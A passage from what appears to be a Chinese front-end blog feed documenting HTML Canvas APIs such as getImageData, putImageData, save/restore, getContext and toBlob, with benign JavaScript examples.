表示图片元素绘制在Canvas画布上起始横坐标。</li><li>sy  表示图片元素绘制在Canvas画布上起始纵坐标。</li><li>sWidth  表示图片元素从坐标点开始算，多大的宽度内容绘制Canvas画布上。</li><li>sHeight  表示图片元素从坐标点开始算，多大的高度内容绘制Canvas画布上。</li></ul><ol start="2"><li>案例</li></ol><ul><li>保持原始图片尺寸和比例</li></ul><pre><code class="javascript">context.drawImage(image, 0, 0);</code></pre><ul><li>拉伸图片到指定大小和位置</li></ul><pre><code class="javascript">context.drawImage(image, 0, 0, 300, 150);</code></pre><ul><li>拉伸图片同时保持图片比例</li></ul><pre><code class="javascript">context.drawImage(image, 0, 42, 500, 250, 0, 0, 300, 150);</code></pre><h3 id="createImageData"><a href="#createImageData" class="headerlink" title=".createImageData()"></a>.createImageData()</h3><p>创建一个新的空白的ImageData对象。</p><ol><li>语法</li></ol><pre><code class="javascript">context.createImageData(width, height); context.createImageData(imagedata);</code></pre><ul><li>width  ImageData对象包含的width值。如果ImageData对象转换成图像，则此width也是最终图像呈现的宽度。</li><li>height  ImageData对象包含的height值。如果ImageData对象转换成图像，则此height也是最终图像呈现的高度。</li><li>imagedata  一个存在的ImageData对象，只会使用该ImageData对象中的width和height值，包含的像素信息会全部转换为透明黑。</li></ul><ol start="2"><li>案例<br>使用createImageData()方法创建一个图像，例如，所有位置是5的倍数的地方我们塞入一个绿色颜色值，这样可以得到一个点阵图效果</li></ol><pre><code class="html">&lt;canvas id=&quot;canvas&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">// 绘制在Canvas上var context = canvas.getContext(&#39;2d&#39;);var imagedata = context.createImageData(300, 150);// 给对应坐标位置的数据设置色值为绿色for (var x = 1; x &lt;= 300; x+=5) &#123;    for (var y = 1; y &lt;= 150; y+= 5) &#123;        var index = 4 * ((y - 1) * 300 + (x - 1));        // 变为绿色，色值依次是0, 128, 0, 256        imagedata.data[index] = 0;        imagedata.data[index + 1] = 128;        imagedata.data[index + 2] = 0;        imagedata.data[index + 3] = 256;    &#125;&#125;// 再重绘context.putImageData(imagedata, 0, 0);</code></pre><h3 id="getImageData"><a href="#getImageData" class="headerlink" title=".getImageData()"></a>.getImageData()</h3><p>获取Canvas画布的设定区域的ImageData对象。</p><ol><li>语法</li></ol><pre><code class="javascript">context.getImageData(sx, sy, sWidth, sHeight);</code></pre><ul><li>sx  需要返回的图像数据区域的起始横坐标。</li><li>sy  需要返回的图像数据区域的起始纵坐标。</li><li>sWidth  需要返回的图像数据区域的宽度。</li><li>sHeight  需要返回的图像数据区域的高度。</li></ul><ol start="2"><li>案例<br>绘制一张图片到Canvas画布上，然后把中间100*100区域变成灰色。</li></ol><pre><code class="html">&lt;canvas id=&quot;canvas&quot; width=&quot;250&quot; height=&quot;167&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var img = new Image();img.onload = function () &#123;    var context = canvas.getContext(&#39;2d&#39;);    // 图片绘制    context.drawImage(this, 0, 0, 250, 167);    // 然后获取中间100*100区域数据    var imageData = context.getImageData(75, 34, 100, 100);    var length = imageData.data.length;    for (var index = 0; index &lt; length; index += 4) &#123;        var r = imageData.data[index];        var g = imageData.data[index + 1];        var b = imageData.data[index + 2];        // 计算灰度        var gray = r * 0.299 + g * 0.587 + b * 0.114;        imageData.data[index] = gray;        imageData.data[index + 1] = gray;        imageData.data[index + 2] = gray;    &#125;    // 更新新数据    context.putImageData(imageData, 75, 34);&#125;;img.src = &#39;./1.jpg&#39;;</code></pre><h3 id="putImageData"><a href="#putImageData" class="headerlink" title=".putImageData()"></a>.putImageData()</h3><p>给定的ImageData对象应用在Canvas画布上。</p><ol><li>语法</li></ol><pre><code class="javascript">context.putImageData(imagedata, dx, dy);context.putImageData(imagedata, dx, dy, dirtyX, dirtyY, dirtyWidth, dirtyHeight);</code></pre><ul><li>imagedata  包含图像像素信息的ImageData对象。</li><li>dx  目标Canvas中被图像数据替换的起点横坐标。</li><li>dy  目标Canvas中被图像数据替换的起点纵坐标。</li><li>dirtyX  （可选）图像数据渲染区域的左上角横坐标。默认值是0。</li><li>dirtyY  （可选）图像数据渲染区域的左上角纵坐标。默认值是0。</li><li>dirtyWidth  （可选）图像数据渲染区域的宽度。默认值是imagedata图像的宽度。</li><li>dirtyHeight  （可选）图像数据渲染区域的高度。默认值是imagedata图像的高度。</li><li></li><li></li></ul><ol start="2"><li>案例<br>使用getImageData()方法获取imagedata数据源，然后仅中心100*100区域替换原始Canvas。</li></ol><pre><code class="html">&lt;img id=&quot;image1&quot; src=&quot;./1.jpg&quot; alt=&quot;目标图片&quot;&gt;&lt;img id=&quot;image2&quot; src=&quot;./1.jpg&quot; alt=&quot;数据源图片&quot;&gt;&lt;canvas id=&quot;canvas&quot; width=&quot;300&quot; height=&quot;200&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">// 尺寸var width = 300, height = 200;// 目标Canvas上下文var context = canvas.getContext(&#39;2d&#39;);// 目标Canvas绘制context.drawImage(image1, 0, 0, width, height);// 获取覆盖图数据var dirtyCanvas = document.createElement(&#39;canvas&#39;);var dirtyContext = dirtyCanvas.getContext(&#39;2d&#39;);// 设置屏幕外Canvas尺寸dirtyCanvas.width = width;dirtyCanvas.height = height;// 绘制替换图dirtyContext.drawImage(image2, 0, 0, width, height);// 此时可以得到imagedata数据var imagedata = dirtyContext.getImageData(0, 0, width, height);// 然后中间100*100区域替换目标Canvascontext.putImageData(imagedata, 0, 0, 100, 50, 100, 100);</code></pre><h2 id="Canvas状态"><a href="#Canvas状态" class="headerlink" title="Canvas状态"></a>Canvas状态</h2><h3 id="save"><a href="#save" class="headerlink" title=".save()"></a>.save()</h3><p>存储当前Canvas的状态。</p><ol><li>语法</li></ol><pre><code class="javascript">context.save();</code></pre><ol start="2"><li>案例<br>先存储默认的Canvas状态，再还原，可以看到填充颜色变成了默认的黑色了。</li></ol><pre><code class="javascript">// 保存初始Canvas状态context.save();// 设置红色填充context.fillStyle = &#39;red&#39;;// 矩形填充context.fillRect(20, 20, 100, 60);// 还原在绘制context.restore();// 矩形填充againcontext.fillRect(180, 60, 100, 60);</code></pre><h3 id="restore"><a href="#restore" class="headerlink" title=".restore()"></a>.restore()</h3><p>恢复Canvas到前一次存储的状态。</p><ol><li>语法</li></ol><pre><code class="javascript">context.restore();</code></pre><ol start="2"><li>案例<br>点击“保存”按钮，我们不断递增改变Canvas上下文的font属性值，然后执行save()方法存储当前Canvas状态，然后点击“恢复”按钮执行restore()进行恢复。</li></ol><pre><code class="html">&lt;input id=&quot;save&quot; type=&quot;submit&quot; value=&quot;保存&quot;&gt;&lt;input id=&quot;restore&quot; type=&quot;reset&quot; value=&quot;恢复&quot;&gt;&lt;canvas id=&quot;canvas&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var context = canvas.getContext(&#39;2d&#39;);// 初始字体大小var fontSize = 16;// 初始文字填充context.font = fontSize + &#39;px arial&#39;;context.fillText(&#39;观察字号大小&#39;, 10, 80);// 按钮事件save.addEventListener(&#39;click&#39;, function () &#123;    context.clearRect(0, 0, 300, 150);    // 状态继续存储    context.save();    // 字号递增    fontSize++;    context.font = fontSize + &#39;px arial&#39;;    context.fillText(&#39;观察字号大小&#39;, 10, 80);        &#125;);restore.addEventListener(&#39;click&#39;, function () &#123;    context.clearRect(0, 0, 300, 150);    // 字号递减    fontSize--;    // 恢复上一次状态    context.restore();    // 看看现在字号大小    context.fillText(&#39;观察字号大小&#39;, 10, 80);&#125;);</code></pre><h3 id="canvas"><a href="#canvas" class="headerlink" title=".canvas"></a>.canvas</h3><p>反向识别当前上下文源自哪个HTMLCanvasElement。</p><ol><li>语法</li></ol><pre><code class="javascript">var canvas = context.canvas;</code></pre><ol start="2"><li>案例<br>扩展一个名为fullCircle()按照最短边画圆的Canvas上下文方法，此时需要知道Canvas的尺寸，此时canvas属性就派上用场了：</li></ol><pre><code class="html">&lt;canvas&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">CanvasRenderingContext2D.prototype.fullCircle = function (style) &#123;    // 反向获取当前上下文源Canavs元素    var canvas = this.canvas;    // 获取最短边半径    var minRadius = Math.min(canvas.width, canvas.height) / 2;    // 使用arc() API绘制圆    this.fillStyle = style || &#39;#000&#39;;    // 绘制    this.beginPath();    this.arc(canvas.width / 2, canvas.height / 2, minRadius, 0, 2 * Math.PI);    this.fill();&#125;;// 调用document.querySelector(&#39;canvas&#39;).getContext(&#39;2d&#39;).fullCircle(&#39;red&#39;);</code></pre><h2 id="其他方法"><a href="#其他方法" class="headerlink" title="其他方法"></a>其他方法</h2><p>其他一些不常用的API方法。</p><h3 id="drawFocusIfNeeded"><a href="#drawFocusIfNeeded" class="headerlink" title=".drawFocusIfNeeded()"></a>.drawFocusIfNeeded()</h3><p>如果给定元素被聚焦，则该方法在当前路径周围绘制焦点环。</p><ol><li>语法</li></ol><pre><code class="javascript">context.drawFocusIfNeeded(element);context.drawFocusIfNeeded(path, element);</code></pre><ul><li>element  用来检测当前是否处于focus状态的元素。此元素需要原本就是可聚焦的元素，例如按钮或者链接或者输入框等。然后，还需要放置在canvas标签中才有用。</li><li>path  指Path2D对象。</li></ul><ol start="2"><li>案例<br>点击画布中的2个圈圈元素，此时会触发canvas包裹的对应的button按钮的focus态，然后Canvas圈圈呈现高亮效果，此高亮效果为系统自动，可以描绘出各种曲线。</li></ol><pre><code class="html">&lt;canvas id=&quot;canvas&quot; width=&quot;240&quot; height=&quot;120&quot;&gt;    &lt;button id=&quot;button1&quot;&gt;按钮1&lt;/button&gt;    &lt;button id=&quot;button2&quot;&gt;按钮2&lt;/button&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">// 两个按钮元素var button1 = document.getElementById(&#39;button1&#39;);var button2 = document.getElementById(&#39;button2&#39;);// canvas元素和上下文var canvas = document.querySelector(&#39;#canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);var draw = function () &#123;    context.clearRect(0, 0, 240, 120);    // 设置字体样式    context.font = &#39;16px STHeiti, SimHei&#39;;    context.textAlign = &#39;center&#39;;    context.textBaseline = &#39;middle&#39;;    // 绘制两个圆和文字    context.beginPath();    context.arc(60, 60, 50, 0, Math.PI * 2);    context.fillStyle = &#39;red&#39;;    context.fill();    context.fillStyle = &#39;white&#39;;    context.fillText(&#39;按钮1&#39;, 60, 60);    context.drawFocusIfNeeded(button1);    context.beginPath();    context.arc(180, 60, 50, 0, Math.PI * 2);    context.fillStyle = &#39;green&#39;;    context.fill();    context.fillStyle = &#39;white&#39;;    context.fillText(&#39;按钮2&#39;, 180, 60);    context.drawFocusIfNeeded(button2);&#125;;draw();// 点击canvas元素canvas.addEventListener(&#39;click&#39;, function (event) &#123;    // 通过点击位置判断点击是哪个圈圈    var x = event.clientX - canvas.getBoundingClientRect().left;    var y = event.clientY - canvas.getBoundingClientRect().top;    // 距离两个圈圈圆心的距离    var distance1 = Math.sqrt((60 - x) * (60 - x) + (60 - y) * (60 - y));    var distance2 = Math.sqrt((180 - x) * (180 - x) + (60 - y) * (60 - y));    // 根据距离和半径大小判断是否在圈内    if (distance1 &lt;= 50) &#123;        button1.focus();        draw();    &#125; else if (distance2 &lt; 50) &#123;        button2.focus();        draw();    &#125;&#125;);</code></pre><h3 id="scrollPathIntoView"><a href="#scrollPathIntoView" class="headerlink" title=".scrollPathIntoView()"></a>.scrollPathIntoView()</h3><p>将当前路径或给定路径滚动到视图中。</p><blockquote><p>注意，这个功能在当前的浏览器标准中可能还未被广泛实现或支持。该方法旨在允许开发者将指定的路径（path）滚动到视口（viewport）内，使得该路径对用户可见。</p></blockquote><ol><li>语法</li></ol><pre><code class="javascript">context.scrollPathIntoView();context.scrollPathIntoView(path);</code></pre><ul><li>path  指Path2D对象。</li></ul><ol start="2"><li>案例</li></ol><pre><code class="html">&lt;canvas id=&quot;canvas&quot;&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">const canvas = document.getElementById(&#39;canvas&#39;);const ctx = canvas.getContext(&#39;2d&#39;);ctx.beginPath();ctx.fillRect(10, 10, 30, 30);ctx.scrollPathIntoView();</code></pre>]]></content>
      
      
      <categories>
          
          <category> FrontEnd </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Canvas </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTMLCanvasElement</title>
      <link href="/2024/11/01/frontend-canvas-htmlcanvaselement/"/>
      <url>/2024/11/01/frontend-canvas-htmlcanvaselement/</url>
      
        <content type="html"><![CDATA[<h2 id="了解HTMLCanvasElement"><a href="#了解HTMLCanvasElement" class="headerlink" title="了解HTMLCanvasElement"></a>了解HTMLCanvasElement</h2><p>HTMLCanvasElement可以看成是是所有canvas元素的代称，是一个在浏览器可视窗体中可以全局访问的接口，例如我们在Chrome浏览器控制台执行 window.HTMLCanvasElement，会返回：</p><pre><code>fHTMLCanvasElement()&#123; [native code] &#125;</code></pre><p>类似的还有HTMLDivElement（对应div元素）、HTMLImageElement（对应img元素）、HTMLParagraphElement（对应<p>元素）等一列接口，几乎所有的标准HTML标签都有一个个对应的接口名称，然后全部都继承于HTMLElement。</p><p>这些接口都是DOM Level 2中出现的，因此，IE9+浏览器才支持，IE8浏览器并不支持。考虑到canvas元素也是IE9+开始支持的，因此，如果你有需要使用HTMLCanvasElement的场景，就无需担心兼容性问题。</p><p>通常这些接口会内置一些属性和方法，方便用户使用。我们也可以根据自己需求，自定义一些方法，方便调用。例如，下面这个检测canvas画布上是否有透明或半透明像素点的方法：</p><pre><code class="javascript">// 检测canvas画布上是否有透明或半透明像素点HTMLCanvasElement.prototype.isSomeAlphaPixel = function () &#123;    var context = this.getContext(&#39;2d&#39;);    // 获取图片像素信息    var imageData = context.getImageData(0, 0, this.width, this.height).data;    // 检测有没有透明数据    var isAlphaBackground = false;    for (var index = 3; index &lt; imageData.length; index += 4) &#123;        if (imageData[index] != 255) &#123;            isAlphaBackground = true;            break;            &#125;    &#125;    return isAlphaBackground;&#125;;</code></pre><p>此时，页面上任意<canvas>元素DOM对象都可以调用isSomeAlphaPixel()方法。例如：</p><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);// 输出true或falseconsole.log(canvas.isSomeAlphaPixel());</code></pre><h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p>除了id，className，title这类所有HTML元素都拥有的属性外，HTMLCanvasElement还有如下一些符合规范标准的属性。</p><h3 id="height"><a href="#height" class="headerlink" title="height"></a>height</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>表示canvas画布绘制区域的高度，标准属性值为正整数，单位是像素。如果高度值不合法，例如负数，则会使用默认的150代替。为什么是150而不是其他高度值呢？这个是CSS规范中定义的，作为替换元素，默认的尺寸是300 * 150，canvas元素就是替换元素，因此默认高度是150。由于svg元素也是替换元素，因此，svg默认的尺寸也是300 * 150。</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><ul><li>获取高度</li></ul><pre><code class="javascript">let pixel = canvas.height</code></pre><ul><li>设置高度</li></ul><pre><code class="javascript">canvas.height = pixel</code></pre><h4 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h4><p>随机改变画布的高度</p><pre><code class="html">&lt;canvas style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>关键JavaScript代码</li></ul><pre><code class="javascript">canvas.height = 50 + 100 * Math.random()</code></pre><h4 id="详细"><a href="#详细" class="headerlink" title="详细"></a>详细</h4><p>虽然height标准属性值只能是整数，但是实际上：</p><ul><li>如果设置小数，浏览器不会认为是不合法的。基本各个主流浏览器渲染时会忽略小数部分，例如：</li></ul><pre><code class="html">&lt;canvas height=&quot;88.888&quot; style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>如果高度是包含单位的，则会自动忽略单位，无论这个单位是px、em还是其他什么，例如：</li></ul><pre><code class="html">&lt;canvas height=&quot;88em&quot; style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>如果高度值后面是个完全不合法的字符，则按照前面的数值进行高度解析，例如：</li></ul><pre><code class="html">&lt;canvas height=&quot;88abc&quot; style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>如果高度值是负数，则Chrome&#x2F;Firefox等浏览器下会以150像素的高度呈现，而IE浏览器下高度为0，这个是唯一存在兼容性差异表现的属性值，例如：</li></ul><pre><code class="html">&lt;canvas height=&quot;-150&quot; style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>如果高度属性值缺省，则会以150像素高度呈现，这个在所有浏览器下都是如此，例如：</li></ul><pre><code class="html">&lt;canvas style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><h5 id="和CSS-height关系"><a href="#和CSS-height关系" class="headerlink" title="和CSS height关系"></a>和CSS height关系</h5><p>从视觉表现上而言，CSS的height样式权重大于canvas元素的height属性权重<br>canvas元素本质上就是一个图片，其很多样式表现和img元素是一致的，例如CSS控制图片尺寸的时候，如果高度缺省，canvas和img元素都是依然保持原始的宽高比例。但是，深究下来和img元素还是有一点区别，就是canvas的等比例特性是强制的，会忽略HTML属性的设置，但img不会这样。例如：</p><pre><code class="html">&lt;!-- 这时img的宽度依然是300px，并未保持比例 --&gt;&lt;img src=&quot;./1.jpg&quot; width=&quot;300&quot; height=&quot;150&quot; style=&quot;height:88px;&quot;&gt;&lt;!-- canvas仍保持宽高比例 --&gt;&lt;canvas width=&quot;300&quot; height=&quot;150&quot; style=&quot;background:green; height:88px;&quot;&gt;&lt;/canvas&gt;</code></pre><h5 id="Canvas绘制CSS与height无关"><a href="#Canvas绘制CSS与height无关" class="headerlink" title="Canvas绘制CSS与height无关"></a>Canvas绘制CSS与height无关</h5><p>当我们使用各个Canvas API进行图形图像绘制的时候，其坐标位置，尺寸大小等都是相当于canvas元素的HTML属性height，与CSS height没有任何关系，例如：</p><pre><code class="html">&lt;canvas height=&quot;150&quot; style=&quot;background:green; height:88px;&quot;&gt;&lt;/canvas&gt;</code></pre><p>以canvas元素中心点为圆心画一个圆，则垂直坐标应该是75，是HTML height属性值的一半，而非CSS height值的一半。</p><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);context.fillStyle = &#39;orange&#39;;context.arc(150, 75, 75, 0, 2 * Math.PI);context.fill();</code></pre><h3 id="width"><a href="#width" class="headerlink" title="width"></a>width</h3><h4 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h4><p>表示canvas画布绘制区域的宽度，标准属性值为正整数，单位是像素。如果宽度值不合法，例如负数，则会使用默认的300代替。为什么是300而不是其他宽度值呢？这个是CSS规范中定义的，作为替换元素，默认的尺寸是300 * 150，canvas元素就是替换元素，因此默认宽度是300。由于svg元素也是替换元素，因此，svg默认的尺寸也是300 * 150。</p><h4 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h4><ul><li>获取宽度</li></ul><pre><code class="javascript">let pixel = canvas.width;</code></pre><ul><li>设置宽度</li></ul><pre><code class="javascript">canvas.width = pixel;</code></pre><h4 id="案例-1"><a href="#案例-1" class="headerlink" title="案例"></a>案例</h4><p>随机改变画布的宽度。</p><pre><code class="html">&lt;canvas style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>关键JavaScript代码</li></ul><pre><code class="javascript">canvas.width = 150 + 150 * Math.random();</code></pre><h4 id="详细-1"><a href="#详细-1" class="headerlink" title="详细"></a>详细</h4><p>虽然width标准属性值只能是整数，但是实际上：</p><ul><li>如果设置小数，浏览器不会认为是不合法的。基本各个主流浏览器渲染时会忽略小数部分，例如：</li></ul><pre><code class="html">&lt;canvas width=&quot;188.888&quot; style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>如果宽度是包含单位的，则会自动忽略单位，无论这个单位是px、em还是其他什么，例如：</li></ul><pre><code class="html">&lt;canvas width=&quot;188em&quot; style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>如果宽度值后面是个完全不合法的字符，则按照前面的数值进行宽度解析，例如：</li></ul><pre><code class="html">&lt;canvas width=&quot;188abc&quot; style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>如果宽度值是负数，则Chrome&#x2F;Firefox等浏览器下会以150像素的宽度呈现，而IE浏览器下宽度为0，这个是唯一存在兼容性差异表现的属性值，例如：</li></ul><pre><code class="html">&lt;canvas width=&quot;-300&quot; style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><ul><li>如果宽度值缺省，则会以300像素宽度呈现，这个所有浏览器下都是如此，例如：</li></ul><pre><code class="html">&lt;canvas style=&quot;background:green;&quot;&gt;&lt;/canvas&gt;</code></pre><h5 id="和CSS-width关系"><a href="#和CSS-width关系" class="headerlink" title="和CSS width关系"></a>和CSS width关系</h5><p>从视觉表现上而言，CSS的width样式权重大于canvas元素的width属性权重<br>canvas元素本质上就是一个图片，其很多样式表现和img元素是一致的，例如CSS控制图片尺寸的时候，如果高度缺省，canvas和img元素都是依然保持原始的宽高比例。但是，深究下来和img元素还是有一点区别，就是canvas的等比例特性是强制的，会忽略HTML属性的设置，但img不会这样。例如：</p><pre><code class="html">&lt;!-- 这时img的高度依然是300px，并未保持比例 --&gt;&lt;img src=&quot;./1.jpg&quot; width=&quot;300&quot; height=&quot;150&quot; style=&quot;width:188px;&quot;&gt;&lt;!-- canvas仍保持宽高比例 --&gt;&lt;canvas width=&quot;300&quot; height=&quot;150&quot; style=&quot;background:green; width:188px;&quot;&gt;&lt;/canvas&gt;</code></pre><h5 id="Canvas绘制CSS与height无关-1"><a href="#Canvas绘制CSS与height无关-1" class="headerlink" title="Canvas绘制CSS与height无关"></a>Canvas绘制CSS与height无关</h5><p>当我们使用各个Canvas API进行图形图像绘制的时候，其坐标位置，尺寸大小等都是相当于canvas元素的HTML属性width，与CSS width没有任何关系，例如：</p><pre><code class="html">&lt;canvas width=&quot;300&quot; style=&quot;background:green; width:188px;&quot;&gt;&lt;/canvas&gt;</code></pre><p>以canvas元素中心点为圆心画一个圆，则水平坐标应该是150，是HTML width属性值的一半，而非CSS width值的一半。</p><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);context.fillStyle = &#39;orange&#39;;context.arc(150, 75, 75, 0, 2 * Math.PI);context.fill();</code></pre><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="getContext"><a href="#getContext" class="headerlink" title="getContext()"></a>getContext()</h3><h4 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h4><p>getContext()方法可以返回canvas的绘制上下文，“上下文”是计算机领域的一个术语，类似于小说中的藏经阁，现实世界的工具箱，表示一种特殊的环境。在这个环境中，我们就能做一些特殊的事情，对于Canvas而言，我们可以借助其上下文绘制各种图形和效果。</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><pre><code class="javascript">var context = canvas.getContext(contextType, contextAttributes)</code></pre><ol><li>参数contextType（string类型）</li></ol><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>‘2d’</td><td>会创建并返回一个CanvasRenderingContext2D对象，主要用来进行2d绘制，也就是二维绘制，平面绘制。</td></tr><tr><td>‘webgl’或’experimental-webgl’</td><td>此参数可以返回一个WebGLRenderingContext（WebGL渲染上下文）对象，WebGL（全写Web Graphics Library）是一种3D绘图协议，可以为HTML5 Canvas提供硬件3D加速渲染，这样Web开发人员就可以借助系统显卡来在浏览器里更流畅地展示3D场景和模型，无需安装任何其他插件。此参数对应的WebGL版本1（OpenGL ES 2.0）。</td></tr><tr><td>‘webgl2’</td><td>此参数可以返回一个WebGL2RenderingContext对象，可以用来绘制三维3D效果。此参数对应的WebGL版本2（OpenGL ES 3.0）。不过目前这个还处于试验阶段，我们实际Kaufman都是使用’webgl’这个参数。</td></tr><tr><td>‘bitmaprenderer’</td><td>创建一个ImageBitmapRenderingContext（位图渲染上下文），可以借助给定的ImageBitmap替换Canavs的内容。</td></tr><tr><td>2. 参数contextAttributes（Object类型，可选）</td><td></td></tr></tbody></table><p>参数 | 描述 | contextType值<br>—|—|<br>alpha | 表示Canavs是否包含alpha透明通道，如果设置为false，则表示Canvas不支持全透明或者半透明，在绘制带有透明效果的图形或者图像时候速度会更快一些。 | ‘2d’<br>alpha | 表示Canavs是否包含透明缓冲区。 | ‘webgl’<br>antialias | 表示是否需要抗边缘锯齿。如果设置为true，图像呈现质量会好一些，但是速度会拖慢。 | ‘webgl’<br>depth | 表示绘制缓冲区的缓冲深度至少16位。 | ‘webgl’<br>failIfMajorPerformanceCaveat | 表示如果用户的系统性能比较差，是否继续常见绘制上下文。 | ‘webgl’<br>powerPreference | 高速用户使用的客户端（如浏览器）我们现在这个WebGL上下文最合适的GPU配置是什么。支持下面关键字值：’default’（让用户的客户端设备自己觉得那个GPU配置是最合适的。这个是此参数的默认值。）、’high-performance’（渲染性能优先，通常更耗掉（如手机，平板等移动设备）。）、’low-power’（省电优先，渲染性能权重可以低一些。） | ‘webgl’<br>premultipliedAlpha | 表示页面合成器将假定绘图缓冲区包含具有alpha预乘（pre-multiplied alpha）颜色。 | ‘webgl’<br>preserveDrawingBuffer | 如果值为true，则不会清除缓冲区并保留其值，直到作者清除或覆盖。 | ‘webgl’<br>stencil | 表示绘图缓冲区具有至少8位的模板缓冲区。 | ‘webgl’<br>示例：</p><pre><code class="javascript">var gl = canvas.getContext(&#39;webgl&#39;, &#123;    antialias: false,    depth: false,&#125;);</code></pre><ol start="3"><li>返回值<br>无论getContext()方法中的参数是什么，其返回值都可以称之为RenderingContext，再细分可以包括下面这些：</li></ol><ul><li>‘2d’参数值对应的CanvasRenderingContext2D；</li><li>‘webgl’或experimental-webgl参数值对应的WebGLRenderingContext；</li><li>‘webgl2’参数值对应的WebGL2RenderingContext；</li><li>‘bitmaprenderer’参数值对应的ImageBitmapRenderingContext。</li></ul><h4 id="案例-2"><a href="#案例-2" class="headerlink" title="案例"></a>案例</h4><pre><code class="html">&lt;canvas&gt;&lt;/canvas&gt;</code></pre><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);// 打印出context对象属性名或方法名console.dir(context);</code></pre><h4 id="更多"><a href="#更多" class="headerlink" title="更多"></a>更多</h4><p>基本上，只要我们使用canvas实现功能，getContext()方法调用100%需要使用。甚至可以这么说，只要你想用canvas实现任何平面效果，首先不管三七二十一，先把下面2行写上：</p><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);var context = canvas.getContext(&#39;2d&#39;);</code></pre><p>当然如果页面存在多个canvas元素，我们可以自己加个id或者class类名在配合选择器获取。也可以直接create创建，然后append到页面中，例如：</p><pre><code class="javascript">var canvas = document.createElement(&#39;canvas&#39;);document.body.appendChild(canvas);var context = canvas.getContext(&#39;2d&#39;);</code></pre><p>如果希望canvas元素放在body元素最前面，则可以：</p><pre><code class="javascript">var canvas = document.createElement(&#39;canvas&#39;);document.body.insertBefore(canvas, document.body.firstElementChild);var context = canvas.getContext(&#39;2d&#39;);</code></pre><h3 id="toBlob"><a href="#toBlob" class="headerlink" title="toBlob()"></a>toBlob()</h3><h4 id="简介-3"><a href="#简介-3" class="headerlink" title="简介"></a>简介</h4><p>toBlob()方法可以Canvas图像对应的Blob对象（binary large object）。此方法可以把Canvas图像缓存在磁盘上，或者存储在内存中，这个往往由浏览器决定。</p><h4 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h4><pre><code class="javascript">void canvas.toBlob(callback, mimeType, quality);</code></pre><p>这里的void表示无返回值。</p><ul><li>callback（Function）<br>toBlob()方法执行成功后的回调方法，支持一个参数，表示当前转换的Blob对象。</li><li>mimeType（String，可选）<br>mimeType表示需要转换的图像的mimeType类型。默认值是image&#x2F;png，还可以是image&#x2F;jpeg，甚至image&#x2F;webp（前提浏览器支持）等。</li><li>quality（Number，可选）<br>quality表示转换的图片质量。范围是0到1。由于Canvas的toBlob()方法转PNG是无损的，因此，此参数默认是没有效的，除非，指定图片mimeType是image&#x2F;jpeg或者image&#x2F;webp，此时默认压缩值是0.92。</li></ul><h4 id="案例-3"><a href="#案例-3" class="headerlink" title="案例"></a>案例</h4><h5 id="案例1-Blob图像上传"><a href="#案例1-Blob图像上传" class="headerlink" title="案例1(Blob图像上传)"></a>案例1(Blob图像上传)</h5><p>这个案例演示的是Canvas图像转换成Blob二进制对象并使用HTML5 FormData进行Ajax上传。</p><pre><code class="html">&lt;canvas&gt;&lt;/canvas&gt;</code></pre><p>假设上面canvas是已经绘制好的图形，我们需要Ajax提交到后台进行保存，则JavaScript代码可以这样：</p><pre><code class="javascript">var canvas = document.querySelector(&#39;canvas&#39;);// canvas转为blob并上传canvas.toBlob(function (blob) &#123;    var data = new FormData();    // 装载图片数据    data.append(&#39;image&#39;, blob);    // 图片ajax上传，字段名是image    var xhr = new XMLHttpRequest();    // 文件上传成功    xhr.onload = function() &#123;        // xhr.responseText就是返回的数据    &#125;;    // 开始上传    xhr.open(&#39;POST&#39;, &#39;upload.php&#39;, true);    xhr.send(data);    &#125;);</code></pre><h5 id="案例2-IMG图像数据为Blob"><a href="#案例2-IMG图像数据为Blob" class="headerlink" title="案例2(IMG图像数据为Blob)"></a>案例2(IMG图像数据为Blob)</h5><p>如果我们希望把canvas元素图像使用img元素显示，toBlob()和toDataURL()方法都是可以的，但个人推荐使用toBlob()方法（如果不用顾及兼容性）。<br>blob数据对象是无法直接作为img的src属性值呈现的，需要URL.createObjectURL()方法处理下。<br>Blob数据转URL地址关键JavaScript代码如下：</p><pre><code 